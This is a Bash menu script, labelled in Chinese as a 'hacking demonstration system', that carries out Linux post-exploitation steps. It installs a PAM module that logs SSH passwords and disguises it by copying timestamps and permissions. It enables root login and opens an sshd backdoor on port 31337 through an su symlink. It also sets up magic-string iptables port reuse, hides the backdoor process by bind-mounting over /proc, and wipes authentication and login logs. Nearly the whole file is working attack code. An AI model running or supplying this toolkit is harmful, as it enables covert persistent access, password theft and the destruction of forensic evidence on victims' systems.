#!/bin/bash

while true
do  
    clear
    echo "
    =============================================
				  ██   ██        
				 ░░██ ██  ██   ██
				  ░░███  ░██  ░██
				   ░██   ░██  ░██
				   ██    ░██  ░██
				  ██     ░░██████
				 ░░       ░░░░░░ 
                Hacking Demonstration System V1.1  
    ============================================= 
    1.创建pam后门
    2.端口复用
    3.查看pam后门进程
    4.进程隐藏   
    5.密码监听
    6.监听密码查看
    7.溯源追查
    9.痕迹清理
    0.Exit
    "

    read -r -p "请输入对应操作的序号：" input
    case $input in
        1)
            str1=$(cat /etc/ssh/sshd_config)
			str2="UsePAM"
			result=$(echo $str1 | grep "${str2}")
            if [ "$result"  > /dev/null  ]
            then 
            sed -i 's/.*UsePAM.*/UsePAM yes/'  /etc/ssh/sshd_config
            else
			echo UsePAM yes >> /etc/ssh/sshd_config
        	fi
        	unset str1
        	unset str2
        	unset result
			result=$(echo cat /etc/ssh/sshd_config |grep "PermitRootLogin")
            if [ "$result" > /dev/null ]
            then 
            sed -i 's/.*PermitRootLogin.*/PermitRootLogin yes/'  /etc/ssh/sshd_config
            else
            echo PermitRootLogin yes >> /etc/ssh/sshd_config
        	fi
        	unset result
	        sed -i '/^#.*pam_rootok.so/s/^#//g'  /etc/pam.d/su  
	        # /etc/init.d/sshd restart
	        result=$(uname -a | grep -i -o Rocky)
	        yuan=$(uname -r | grep -i -o linx)
	        wang=$(uname -r | grep -i -o kali)
	        chen=$(echo uname -a | grep -i -o ubuntu)
	        if [ "$result" = "Rocky" ]
	        then
		    cp pam_logpw.so /lib64/security/
	        echo "auth optional pam_unix.so nullok_secure audit" >> /etc/pam.d/sshd && echo "auth optional pam_logpw.so" >> /etc/pam.d/sshd
	        touch -r /lib64/security/pam_unix.so /lib64/security/pam_logpw.so 
            chmod --reference=/lib64/security/pam_unix.so /lib64/security/pam_logpw.so                                #凝思42
	        else
	            if [ "$yuan" = "linx" ] 
	           	then
	           	cp pam_logpw.so /lib/security/pam_logpw.so
				echo "auth optional pam_unix.so nullok_secure audit" >> /etc/pam.d/sshd && echo "auth optional pam_logpw.so" >> /etc/pam.d/sshd
				touch -r /lib/security/pam_unix.so /lib/security/pam_logpw.so 
				chmod --reference=/lib/security/pam_unix.so /lib/security/pam_logpw.so                             #凝思60
				else
					if [ "$wang" > /dev/null ]
					then
					cp pam_logpw.so /lib/x86_64-linux-gnu/security/
					echo "auth optional pam_unix.so nullok_secure audit" >> /etc/pam.d/sshd && echo "auth optional pam_logpw.so" >> /etc/pam.d/sshd
					touch -r /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_logpw.so         
					chmod --reference=/lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_logpw.so    #kali
					else
						if [ "$chen" > /dev/null ]
						then
						cp pam_logpw.so /usr/lib64/security/
						echo "auth optional pam_unix.so nullok_secure audit" >> /etc/pam.d/sshd && echo "auth optional pam_logpw.so" >> /etc/pam.d/sshd
						touch -r /usr/lib64/security/pam_unix.so /usr/lib64/security/pam_logpw.so         
						chmod --reference=/usr/lib64/security/pam_unix.so /usr/lib64/security/pam_logpw.so              #ubuntu
						else
						cp pam_logpw.so /usr/lib64/security/
						touch /usr/lib64/security/pam_unix.so -r /usr/lib64/security/pam_logpw.so 
						chmod --reference=/usr/lib64/security/pam_unix.so /usr/lib64/security/pam_logpw.so                #centos
					    fi
					fi
				fi
			fi
			unset result
			unset chen
			unset yuan
			unset wang
            ln -sf /usr/sbin/sshd /bin/su;/bin/su -oPort=31337
            echo "pam后门创建完成"
            ;;
        2)
            # 新建端口复用链
            iptables -t nat -N LETMEIN
            # 端口复用规则
            iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 31337
            # 开启端口复用开关
            iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
            # 关闭端口复用开关
            iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
            # 开启端口复用
            iptables -t nat -A PREROUTING -p tcp --dport 6000 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
            echo "
            6000端口复用已经开启,可以进行使用
            # 使用socat发送约定口令至目标主机打开端口复用开关
            echo threathuntercoming | socat - tcp:192.168.3.101:6000
            # 使用完毕后，发送约定关闭口令至目标主机目标端口关闭端口复用
            echo threathunterleaving | socat - tcp:192.168.3.101:6000
            "
            ;;
        3)
            echo "
            查看当前pam后门产生的进程：
            "
            ps aux | grep '/bin/su' | grep -v 'grep'
            ;;
        4)
            mkdir .hidden
            mount -o bind .hidden /proc/$(ps aux | grep 'oPort=31337' | grep -v 'grep' |awk -F ' ' '{print $2}')
            echo "
            pam后门进程已经隐藏
            "
            ;;
        5)  

            echo "
                监听密码已开启
            "
            ;;
        6)
            echo "监听的密码记录为：
            "
            if [ -s /var/log/cuts ]
            then cat /var/log/cuts
            else echo "
            当前没有登录记录
            "
            fi
            ;;
        7)  
            echo "
            查看溯源到的敏感信息：
            "
            cat /var/log/auth.log | tail -n 5 
            cat /var/log/wtmp                    
            cat /var/log/lastlog           
            ;;
                        # /var/log/auth.log 
            # /var/log/wtmp
            # /var/log/lastlog
        9)
            echo "
            痕迹清理已完成：
            "
            sed -i 's/pam_logpw.so/onlyfilesystem/g'  /var/log/auth.log 
            sed -i 's/pam_unix/onlyfile/g' /var/log/auth.log 
            echo > /var/log/btmp
            echo > /var/log/wtmp
            echo > /var/log/lastlog 
            echo > /var/log/auth.log 
            cat /dev/null >  /var/log/messages
            cat /dev/null >  /var/log/message
            ;;
        0)
            echo "bye..."
            exit 1               
            ;;
 
        *)
            echo "Invalid input..."        
            ;;
    esac
    read -r -p "输入任意键继续" 
done